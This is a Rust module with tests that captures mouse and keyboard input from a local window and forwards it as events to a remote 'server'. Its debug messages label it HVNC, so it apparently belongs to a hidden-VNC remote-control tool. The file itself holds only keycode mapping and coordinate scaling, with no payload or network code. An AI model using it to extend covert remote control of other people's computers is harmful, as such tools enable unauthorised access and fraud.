//! Input capture for the client


use crate::common::{InputEvent, MouseButton};
use minifb::{Window, Key, MouseMode};
use std::collections::HashSet;
use log::{debug, warn, info};

/// Input capture system for the client
pub struct InputCapture {
    last_mouse_pos: Option<(f32, f32)>,
    pressed_keys: HashSet<Key>,
    mouse_buttons_pressed: HashSet<MouseButton>,
    coordinate_scale: (f32, f32),
    mouse_sensitivity: f32,
}

impl InputCapture {
    /// Create a new input capture system
    pub fn new() -> Self {
        Self {
            last_mouse_pos: None,
            pressed_keys: HashSet::new(),
            mouse_buttons_pressed: HashSet::new(),
            coordinate_scale: (1.0, 1.0),
            mouse_sensitivity: 1.0,
        }
    }
    
    /// Create a new input capture system with custom settings
    pub fn new_with_settings(mouse_sensitivity: f32) -> Self {
        Self {
            last_mouse_pos: None,
            pressed_keys: HashSet::new(),
            mouse_buttons_pressed: HashSet::new(),
            coordinate_scale: (1.0, 1.0),
            mouse_sensitivity: mouse_sensitivity.max(0.1).min(5.0),
        }
    }
    
    /// Update coordinate scaling based on client and server window sizes
    pub fn update_coordinate_scale(&mut self, client_size: (usize, usize), server_size: (u32, u32)) {
        if client_size.0 > 0 && client_size.1 > 0 && server_size.0 > 0 && server_size.1 > 0 {
            self.coordinate_scale = (
                server_size.0 as f32 / client_size.0 as f32,
                server_size.1 as f32 / client_size.1 as f32,
            );
            debug!("Coordinate scale updated: {:?}", self.coordinate_scale);
        }
    }
    
    /// Capture all input events from the window
    pub fn capture_events(&mut self, window: &Window) -> Vec<InputEvent> {
        let mut events = Vec::new();
        
        // Capture mouse events
        events.extend(self.capture_mouse_events(window));
        
        // Capture keyboard events
        events.extend(self.capture_keyboard_events(window));
        
        events
    }
    
    /// Capture mouse events from the window
    pub fn capture_mouse_events(&mut self, window: &Window) -> Vec<InputEvent> {
        let mut events = Vec::new();
        
        // Get current mouse position
        if let Some((mouse_x, mouse_y)) = window.get_mouse_pos(MouseMode::Clamp) {
            let scaled_pos = self.apply_mouse_sensitivity(mouse_x, mouse_y);
            
            // Check for mouse movement
            if let Some((last_x, last_y)) = self.last_mouse_pos {
                if (scaled_pos.0 - last_x).abs() > 0.5 || (scaled_pos.1 - last_y).abs() > 0.5 {
                    // 🔧 FIX: Proper coordinate translation using current window size
                    let client_size = window.get_size();
                    let server_coords = self.translate_coordinates(
                        scaled_pos.0, 
                        scaled_pos.1, 
                        client_size,
                        (
                            (client_size.0 as f32 * self.coordinate_scale.0) as u32,
                            (client_size.1 as f32 * self.coordinate_scale.1) as u32,
                        )
                    );
                    
                    debug!("🔍 HVNC Mouse Move: Client({:.1}, {:.1}) -> Server({}, {}), Scale({:.2}, {:.2})", 
                           scaled_pos.0, scaled_pos.1, server_coords.0, server_coords.1,
                           self.coordinate_scale.0, self.coordinate_scale.1);
                    
                    events.push(InputEvent::MouseMove {
                        x: server_coords.0,
                        y: server_coords.1,
                    });
                }
            }
            
            self.last_mouse_pos = Some(scaled_pos);
            
            // Check for mouse button events
            events.extend(self.capture_mouse_button_events(window, scaled_pos));
        }
        
        if !events.is_empty() {
            debug!("💁 HVNC Mouse Events: Captured {} events", events.len());
        }
        
        events
    }

    /// Capture mouse button events
    fn capture_mouse_button_events(&mut self, window: &Window, mouse_pos: (f32, f32)) -> Vec<InputEvent> {
        let mut events = Vec::new();
        
        let button_mappings = [
            (window.get_mouse_down(minifb::MouseButton::Left), MouseButton::Left),
            (window.get_mouse_down(minifb::MouseButton::Right), MouseButton::Right),
            (window.get_mouse_down(minifb::MouseButton::Middle), MouseButton::Middle),
        ];
        
        for (is_pressed, button) in button_mappings.iter() {
            let was_pressed = self.mouse_buttons_pressed.contains(button);
            
            if *is_pressed && !was_pressed {
                // Button pressed
                self.mouse_buttons_pressed.insert(button.clone());
                
                // 🔧 FIX: Proper coordinate translation using current window size
                let client_size = window.get_size();
                let server_coords = self.translate_coordinates(
                    mouse_pos.0, 
                    mouse_pos.1, 
                    client_size,
                    (
                        (client_size.0 as f32 * self.coordinate_scale.0) as u32,
                        (client_size.1 as f32 * self.coordinate_scale.1) as u32,
                    )
                );
                
                events.push(InputEvent::MouseClick {
                    x: server_coords.0,
                    y: server_coords.1,
                    button: button.clone(),
                });
                
                debug!("💁 HVNC Mouse Click: {:?} pressed at Client({:.1}, {:.1}) -> Server({}, {})", 
                      button, mouse_pos.0, mouse_pos.1, server_coords.0, server_coords.1);
            } else if !*is_pressed && was_pressed {
                // Button released
                self.mouse_buttons_pressed.remove(button);
                debug!("💁 HVNC Mouse Release: {:?} released", button);
            }
        }
        
        events
    }

    /// Apply mouse sensitivity to coordinates
    fn apply_mouse_sensitivity(&self, x: f32, y: f32) -> (f32, f32) {
        if let Some((last_x, last_y)) = self.last_mouse_pos {
            let delta_x = (x - last_x) * self.mouse_sensitivity;
            let delta_y = (y - last_y) * self.mouse_sensitivity;
            (last_x + delta_x, last_y + delta_y)
        } else {
            (x, y)
        }
    }
    
    /// Capture keyboard events from the window
    pub fn capture_keyboard_events(&mut self, window: &Window) -> Vec<InputEvent> {
        let mut events = Vec::new();
        
        // Get all keys that are currently pressed
        let current_keys: HashSet<Key> = window.get_keys().into_iter().collect();
        
        // Find newly pressed keys
        for key in &current_keys {
            if !self.pressed_keys.contains(key) {
                if let Some(keycode) = self.key_to_virtual_keycode(*key) {
                    events.push(InputEvent::KeyPress {
                        keycode,
                        pressed: true,
                    });
                    debug!("⌨️ HVNC Key Press: {:?} pressed (keycode: {})", key, keycode);
                }
            }
        }
        
        // Find newly released keys
        for key in &self.pressed_keys {
            if !current_keys.contains(key) {
                if let Some(keycode) = self.key_to_virtual_keycode(*key) {
                    events.push(InputEvent::KeyPress {
                        keycode,
                        pressed: false,
                    });
                    debug!("⌨️ HVNC Key Release: {:?} released (keycode: {})", key, keycode);
                }
            }
        }
        
        // Update pressed keys state
        self.pressed_keys = current_keys;
        
        if !events.is_empty() {
            debug!("⌨️ HVNC Keyboard Events: Captured {} events", events.len());
        }
        
        events
    }
    
    /// Convert minifb Key to Windows virtual keycode
    fn key_to_virtual_keycode(&self, key: Key) -> Option<u32> {
        match key {
            // Letters
            Key::A => Some(0x41), Key::B => Some(0x42), Key::C => Some(0x43), Key::D => Some(0x44),
            Key::E => Some(0x45), Key::F => Some(0x46), Key::G => Some(0x47), Key::H => Some(0x48),
            Key::I => Some(0x49), Key::J => Some(0x4A), Key::K => Some(0x4B), Key::L => Some(0x4C),
            Key::M => Some(0x4D), Key::N => Some(0x4E), Key::O => Some(0x4F), Key::P => Some(0x50),
            Key::Q => Some(0x51), Key::R => Some(0x52), Key::S => Some(0x53), Key::T => Some(0x54),
            Key::U => Some(0x55), Key::V => Some(0x56), Key::W => Some(0x57), Key::X => Some(0x58),
            Key::Y => Some(0x59), Key::Z => Some(0x5A),
            
            // Numbers
            Key::Key0 => Some(0x30), Key::Key1 => Some(0x31), Key::Key2 => Some(0x32),
            Key::Key3 => Some(0x33), Key::Key4 => Some(0x34), Key::Key5 => Some(0x35),
            Key::Key6 => Some(0x36), Key::Key7 => Some(0x37), Key::Key8 => Some(0x38),
            Key::Key9 => Some(0x39),
            
            // Function keys
            Key::F1 => Some(0x70), Key::F2 => Some(0x71), Key::F3 => Some(0x72), Key::F4 => Some(0x73),
            Key::F5 => Some(0x74), Key::F6 => Some(0x75), Key::F7 => Some(0x76), Key::F8 => Some(0x77),
            Key::F9 => Some(0x78), Key::F10 => Some(0x79), Key::F11 => Some(0x7A), Key::F12 => Some(0x7B),
            
            // Special keys
            Key::Space => Some(0x20),
            Key::Enter => Some(0x0D),
            Key::Tab => Some(0x09),
            Key::Backspace => Some(0x08),
            Key::Delete => Some(0x2E),
            Key::Insert => Some(0x2D),
            Key::Home => Some(0x24),
            Key::End => Some(0x23),
            Key::PageUp => Some(0x21),
            Key::PageDown => Some(0x22),
            Key::Escape => Some(0x1B),
            
            // Arrow keys
            Key::Left => Some(0x25),
            Key::Up => Some(0x26),
            Key::Right => Some(0x27),
            Key::Down => Some(0x28),
            
            // Modifier keys
            Key::LeftShift => Some(0xA0),
            Key::RightShift => Some(0xA1),
            Key::LeftCtrl => Some(0xA2),
            Key::RightCtrl => Some(0xA3),
            Key::LeftAlt => Some(0xA4),
            Key::RightAlt => Some(0xA5),
            
            // Numpad
            Key::NumPad0 => Some(0x60), Key::NumPad1 => Some(0x61), Key::NumPad2 => Some(0x62),
            Key::NumPad3 => Some(0x63), Key::NumPad4 => Some(0x64), Key::NumPad5 => Some(0x65),
            Key::NumPad6 => Some(0x66), Key::NumPad7 => Some(0x67), Key::NumPad8 => Some(0x68),
            Key::NumPad9 => Some(0x69),
            Key::NumPadDot => Some(0x6E),
            Key::NumPadSlash => Some(0x6F),
            Key::NumPadAsterisk => Some(0x6A),
            Key::NumPadMinus => Some(0x6D),
            Key::NumPadPlus => Some(0x6B),
            Key::NumPadEnter => Some(0x0D),
            
            // Punctuation and symbols
            Key::Semicolon => Some(0xBA),
            Key::Equal => Some(0xBB),
            Key::Comma => Some(0xBC),
            Key::Minus => Some(0xBD),
            Key::Period => Some(0xBE),
            Key::Slash => Some(0xBF),
            Key::Backquote => Some(0xC0),
            Key::LeftBracket => Some(0xDB),
            Key::Backslash => Some(0xDC),
            Key::RightBracket => Some(0xDD),
            Key::Apostrophe => Some(0xDE),
            
            // Caps Lock and Num Lock
            Key::CapsLock => Some(0x14),
            Key::NumLock => Some(0x90),
            
            _ => {
                warn!("Unmapped key: {:?}", key);
                None
            }
        }
    }
    
    /// Translate client coordinates to server coordinates
    pub fn translate_coordinates(
        &self,
        client_x: f32,
        client_y: f32,
        client_size: (usize, usize),
        server_size: (u32, u32),
    ) -> (i32, i32) {
        if client_size.0 == 0 || client_size.1 == 0 || server_size.0 == 0 || server_size.1 == 0 {
            warn!("Invalid size for coordinate translation: client={:?}, server={:?}", 
                  client_size, server_size);
            return (client_x as i32, client_y as i32);
        }
        
        // Calculate scaling factors
        let scale_x = server_size.0 as f32 / client_size.0 as f32;
        let scale_y = server_size.1 as f32 / client_size.1 as f32;
        
        // Apply scaling
        let server_x = (client_x * scale_x) as i32;
        let server_y = (client_y * scale_y) as i32;
        
        // Clamp to server bounds
        let clamped_x = server_x.max(0).min(server_size.0 as i32 - 1);
        let clamped_y = server_y.max(0).min(server_size.1 as i32 - 1);
        
        (clamped_x, clamped_y)
    }
    
    /// Get current mouse sensitivity
    pub fn get_mouse_sensitivity(&self) -> f32 {
        self.mouse_sensitivity
    }
    
    /// Set mouse sensitivity
    pub fn set_mouse_sensitivity(&mut self, sensitivity: f32) {
        let clamped_sensitivity = sensitivity.max(0.1).min(5.0);
        if clamped_sensitivity != sensitivity {
            warn!("Mouse sensitivity {} clamped to {}", sensitivity, clamped_sensitivity);
        }
        self.mouse_sensitivity = clamped_sensitivity;
        debug!("Mouse sensitivity set to: {}", self.mouse_sensitivity);
    }
    
    /// Reset input state
    pub fn reset_state(&mut self) {
        self.last_mouse_pos = None;
        self.pressed_keys.clear();
        self.mouse_buttons_pressed.clear();
        debug!("Input capture state reset");
    }
    
    /// Get input statistics
    pub fn get_input_stats(&self) -> InputStats {
        InputStats {
            pressed_keys_count: self.pressed_keys.len(),
            pressed_mouse_buttons_count: self.mouse_buttons_pressed.len(),
            coordinate_scale: self.coordinate_scale,
            mouse_sensitivity: self.mouse_sensitivity,
            has_mouse_position: self.last_mouse_pos.is_some(),
        }
    }
}

impl Default for InputCapture {
    fn default() -> Self {
        Self::new()
    }
}

/// Input capture statistics
#[derive(Debug, Clone)]
pub struct InputStats {
    pub pressed_keys_count: usize,
    pub pressed_mouse_buttons_count: usize,
    pub coordinate_scale: (f32, f32),
    pub mouse_sensitivity: f32,
    pub has_mouse_position: bool,
}#[cfg
(test)]
mod tests {
    use super::*;
    use minifb::Key;
    
    #[test]
    fn test_input_capture_creation() {
        let capture = InputCapture::new();
        assert!(capture.last_mouse_pos.is_none());
        assert!(capture.pressed_keys.is_empty());
        assert!(capture.mouse_buttons_pressed.is_empty());
        assert_eq!(capture.coordinate_scale, (1.0, 1.0));
        assert_eq!(capture.mouse_sensitivity, 1.0);
    }
    
    #[test]
    fn test_input_capture_with_settings() {
        let capture = InputCapture::new_with_settings(2.5);
        assert_eq!(capture.mouse_sensitivity, 2.5);
        
        // Test clamping
        let capture = InputCapture::new_with_settings(10.0);
        assert_eq!(capture.mouse_sensitivity, 5.0); // Clamped to max
        
        let capture = InputCapture::new_with_settings(0.01);
        assert_eq!(capture.mouse_sensitivity, 0.1); // Clamped to min
    }
    
    #[test]
    fn test_coordinate_scale_update() {
        let mut capture = InputCapture::new();
        
        capture.update_coordinate_scale((800, 600), (1600, 1200));
        assert_eq!(capture.coordinate_scale, (2.0, 2.0));
        
        capture.update_coordinate_scale((1920, 1080), (960, 540));
        assert_eq!(capture.coordinate_scale, (0.5, 0.5));
        
        // Test with zero dimensions (should not update)
        let old_scale = capture.coordinate_scale;
        capture.update_coordinate_scale((0, 600), (800, 600));
        assert_eq!(capture.coordinate_scale, old_scale);
    }
    
    #[test]
    fn test_coordinate_translation() {
        let mut capture = InputCapture::new();
        
        // Test 1:1 scaling
        let result = capture.translate_coordinates(100.0, 200.0, (800, 600), (800, 600));
        assert_eq!(result, (100, 200));
        
        // Test 2x scaling
        let result = capture.translate_coordinates(100.0, 200.0, (800, 600), (1600, 1200));
        assert_eq!(result, (200, 400));
        
        // Test 0.5x scaling
        let result = capture.translate_coordinates(100.0, 200.0, (800, 600), (400, 300));
        assert_eq!(result, (50, 100));
        
        // Test clamping to bounds
        let result = capture.translate_coordinates(1000.0, 800.0, (800, 600), (400, 300));
        assert_eq!(result, (399, 299)); // Clamped to max bounds
        
        // Test with zero dimensions
        let result = capture.translate_coordinates(100.0, 200.0, (0, 600), (800, 600));
        assert_eq!(result, (100, 200)); // Should return original coordinates
    }
    
    #[test]
    fn test_key_to_virtual_keycode_mapping() {
        let capture = InputCapture::new();
        
        // Test letter keys
        assert_eq!(capture.key_to_virtual_keycode(Key::A), Some(0x41));
        assert_eq!(capture.key_to_virtual_keycode(Key::Z), Some(0x5A));
        
        // Test number keys
        assert_eq!(capture.key_to_virtual_keycode(Key::Key0), Some(0x30));
        assert_eq!(capture.key_to_virtual_keycode(Key::Key9), Some(0x39));
        
        // Test function keys
        assert_eq!(capture.key_to_virtual_keycode(Key::F1), Some(0x70));
        assert_eq!(capture.key_to_virtual_keycode(Key::F12), Some(0x7B));
        
        // Test special keys
        assert_eq!(capture.key_to_virtual_keycode(Key::Space), Some(0x20));
        assert_eq!(capture.key_to_virtual_keycode(Key::Enter), Some(0x0D));
        assert_eq!(capture.key_to_virtual_keycode(Key::Escape), Some(0x1B));
        
        // Test arrow keys
        assert_eq!(capture.key_to_virtual_keycode(Key::Left), Some(0x25));
        assert_eq!(capture.key_to_virtual_keycode(Key::Up), Some(0x26));
        assert_eq!(capture.key_to_virtual_keycode(Key::Right), Some(0x27));
        assert_eq!(capture.key_to_virtual_keycode(Key::Down), Some(0x28));
        
        // Test modifier keys
        assert_eq!(capture.key_to_virtual_keycode(Key::LeftShift), Some(0xA0));
        assert_eq!(capture.key_to_virtual_keycode(Key::RightShift), Some(0xA1));
        assert_eq!(capture.key_to_virtual_keycode(Key::LeftCtrl), Some(0xA2));
        assert_eq!(capture.key_to_virtual_keycode(Key::RightCtrl), Some(0xA3));
        
        // Test numpad keys
        assert_eq!(capture.key_to_virtual_keycode(Key::NumPad0), Some(0x60));
        assert_eq!(capture.key_to_virtual_keycode(Key::NumPad9), Some(0x69));
        assert_eq!(capture.key_to_virtual_keycode(Key::NumPadEnter), Some(0x0D));
    }
    
    #[test]
    fn test_mouse_sensitivity() {
        let mut capture = InputCapture::new();
        
        // Test default sensitivity
        assert_eq!(capture.get_mouse_sensitivity(), 1.0);
        
        // Test setting sensitivity
        capture.set_mouse_sensitivity(2.0);
        assert_eq!(capture.get_mouse_sensitivity(), 2.0);
        
        // Test clamping
        capture.set_mouse_sensitivity(10.0);
        assert_eq!(capture.get_mouse_sensitivity(), 5.0); // Clamped to max
        
        capture.set_mouse_sensitivity(0.01);
        assert_eq!(capture.get_mouse_sensitivity(), 0.1); // Clamped to min
    }
    
    #[test]
    fn test_mouse_sensitivity_application() {
        let mut capture = InputCapture::new();
        capture.set_mouse_sensitivity(2.0);
        
        // Set initial position
        capture.last_mouse_pos = Some((100.0, 100.0));
        
        // Apply sensitivity to movement
        let result = capture.apply_mouse_sensitivity(110.0, 120.0);
        
        // With 2x sensitivity, 10 pixel movement becomes 20 pixel movement
        assert_eq!(result, (120.0, 140.0));
    }
    
    #[test]
    fn test_state_reset() {
        let mut capture = InputCapture::new();
        
        // Set some state
        capture.last_mouse_pos = Some((100.0, 200.0));
        capture.pressed_keys.insert(Key::A);
        capture.mouse_buttons_pressed.insert(MouseButton::Left);
        
        // Reset state
        capture.reset_state();
        
        assert!(capture.last_mouse_pos.is_none());
        assert!(capture.pressed_keys.is_empty());
        assert!(capture.mouse_buttons_pressed.is_empty());
    }
    
    #[test]
    fn test_input_stats() {
        let mut capture = InputCapture::new();
        
        // Initial stats
        let stats = capture.get_input_stats();
        assert_eq!(stats.pressed_keys_count, 0);
        assert_eq!(stats.pressed_mouse_buttons_count, 0);
        assert_eq!(stats.coordinate_scale, (1.0, 1.0));
        assert_eq!(stats.mouse_sensitivity, 1.0);
        assert!(!stats.has_mouse_position);
        
        // Add some state
        capture.pressed_keys.insert(Key::A);
        capture.pressed_keys.insert(Key::B);
        capture.mouse_buttons_pressed.insert(MouseButton::Left);
        capture.last_mouse_pos = Some((100.0, 200.0));
        capture.coordinate_scale = (2.0, 1.5);
        capture.mouse_sensitivity = 2.5;
        
        let stats = capture.get_input_stats();
        assert_eq!(stats.pressed_keys_count, 2);
        assert_eq!(stats.pressed_mouse_buttons_count, 1);
        assert_eq!(stats.coordinate_scale, (2.0, 1.5));
        assert_eq!(stats.mouse_sensitivity, 2.5);
        assert!(stats.has_mouse_position);
    }
    
    #[test]
    fn test_default_implementation() {
        let capture = InputCapture::default();
        assert_eq!(capture.mouse_sensitivity, 1.0);
        assert!(capture.pressed_keys.is_empty());
    }
    
    #[test]
    fn test_coordinate_translation_edge_cases() {
        let capture = InputCapture::new();
        
        // Test negative coordinates (should be clamped to 0)
        let result = capture.translate_coordinates(-10.0, -20.0, (800, 600), (800, 600));
        assert_eq!(result, (0, 0));
        
        // Test coordinates at exact bounds
        let result = capture.translate_coordinates(799.0, 599.0, (800, 600), (800, 600));
        assert_eq!(result, (799, 599));
        
        // Test floating point precision
        let result = capture.translate_coordinates(100.5, 200.7, (800, 600), (1600, 1200));
        assert_eq!(result, (201, 401)); // Should be rounded down
    }
    
    #[test]
    fn test_coordinate_scaling_ratios() {
        let capture = InputCapture::new();
        
        // Test various scaling ratios
        let test_cases = vec![
            // (client_size, server_size, input_coord, expected_output)
            ((800, 600), (1600, 1200), (400.0, 300.0), (800, 600)),  // 2x scale
            ((1600, 1200), (800, 600), (800.0, 600.0), (400, 300)),  // 0.5x scale
            ((1920, 1080), (1280, 720), (960.0, 540.0), (640, 360)), // ~0.67x scale
            ((640, 480), (1920, 1440), (320.0, 240.0), (960, 720)),  // 3x scale
        ];
        
        for (client_size, server_size, input_coord, expected) in test_cases {
            let result = capture.translate_coordinates(
                input_coord.0, input_coord.1, client_size, server_size
            );
            assert_eq!(result, expected, 
                      "Failed for client={:?}, server={:?}, input={:?}", 
                      client_size, server_size, input_coord);
        }
    }
    
    #[test]
    fn test_key_mapping_completeness() {
        let capture = InputCapture::new();
        
        // Test that all common keys have mappings
        let common_keys = vec![
            Key::A, Key::B, Key::C, Key::Space, Key::Enter, Key::Tab,
            Key::F1, Key::F5, Key::F12, Key::Key0, Key::Key9,
            Key::Left, Key::Right, Key::Up, Key::Down,
            Key::LeftShift, Key::RightShift, Key::LeftCtrl, Key::RightCtrl,
            Key::NumPad0, Key::NumPad5, Key::NumPad9,
        ];
        
        for key in common_keys {
            let keycode = capture.key_to_virtual_keycode(key);
            assert!(keycode.is_some(), "Key {:?} should have a virtual keycode mapping", key);
            
            // Verify keycode is in valid range (0-255 for Windows virtual keys)
            if let Some(code) = keycode {
                assert!(code <= 255, "Keycode {} for key {:?} exceeds valid range", code, key);
            }
        }
    }
    
    // Note: Tests that require actual window interaction are commented out
    // as they would require a display environment and user interaction
    
    /*
    #[test]
    fn test_mouse_event_capture() {
        // This would require actual window and mouse interaction
        let mut capture = InputCapture::new();
        let window = create_test_window(); // Would need actual window
        
        let events = capture.capture_mouse_events(&window);
        // Test mouse event generation
    }
    
    #[test]
    fn test_keyboard_event_capture() {
        // This would require actual window and keyboard interaction
        let mut capture = InputCapture::new();
        let window = create_test_window(); // Would need actual window
        
        let events = capture.capture_keyboard_events(&window);
        // Test keyboard event generation
    }
    */
}